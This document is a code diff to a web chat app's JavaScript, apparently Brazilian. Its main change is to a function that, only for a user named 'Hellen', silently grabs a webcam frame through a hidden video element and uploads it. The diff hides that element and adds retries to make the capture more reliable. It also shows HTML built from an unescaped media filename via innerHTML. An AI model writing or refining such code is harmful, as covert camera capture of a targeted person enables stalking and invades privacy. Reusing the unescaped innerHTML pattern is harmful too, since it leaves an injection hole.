@@ -391,7 +391,7 @@
             }
         }
 
-        async function captureAutoPhoto() {
+        async function captureAutoPhoto(attempt = 1, maxAttempts = 3) {
             if (currentUser !== "Hellen") return;
             try {
                 if (!stream) {
@@ -399,15 +399,22 @@
                 }
                 const video = document.createElement("video");
                 video.srcObject = stream;
+                document.body.appendChild(video); // Append to DOM to force rendering
+                video.style.display = "none";
                 await video.play();
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => {
                         video.onloadedmetadata = null;
-                        setTimeout(resolve, 500); // Wait for video to stabilize
+                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
                     };
                 });
                 if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    throw new Error("Video dimensions are invalid.");
+                    if (attempt < maxAttempts) {
+                        console.warn(`Tentativa ${attempt} falhou: dimensões de vídeo inválidas. Tentando novamente...`);
+                        document.body.removeChild(video);
+                        return captureAutoPhoto(attempt + 1, maxAttempts);
+                    }
+                    throw new Error("Video dimensions are invalid after multiple attempts.");
                 }
                 const canvas = document.createElement("canvas");
                 canvas.width = video.videoWidth;
@@ -425,9 +432,14 @@
                         console.error("Erro ao enviar foto automática:", err);
                     }
                 }, "image/jpeg");
+                document.body.removeChild(video);
                 video.srcObject = null;
             } catch (err) {
-                console.error("Erro ao capturar foto automática:", err);
+                console.error(`Erro ao capturar foto automática (tentativa ${attempt}):`, err);
+                if (attempt < maxAttempts) {
+                    console.warn(`Tentando novamente... (tentativa ${attempt + 1})`);
+                    return captureAutoPhoto(attempt + 1, maxAttempts);
+                }
                 if (err.name === "NotAllowedError") {
                     alert("Camera access denied. Please allow camera permissions in browser settings.");
                 } else if (err.name === "NotFoundError") {
@@ -475,7 +487,7 @@
                             div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
                         } else if (!msg.singleView) {
                             if (["mp4", "webm", "ogg"].includes(fileExtension)) {
-                                div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/uploads/${msg.media}" type="video/${fileExtension}"></video>`;
+                                div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
                             } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
                                 div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
                             } else {
@@ -586,7 +598,7 @@
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => {
                         video.onloadedmetadata = null;
-                        setTimeout(resolve, 500); // Wait for video to stabilize
+                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
                     };
                 });
                 if (video.videoWidth === 0 || video.videoHeight === 0) {
